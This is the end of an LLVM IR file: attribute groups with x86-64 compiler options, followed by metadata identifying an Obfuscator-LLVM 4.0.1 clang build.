attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146537462}
!2 = !{i32 -2146536334}
!3 = !{i32 -2146535643}
!4 = !{i32 -2146534894}
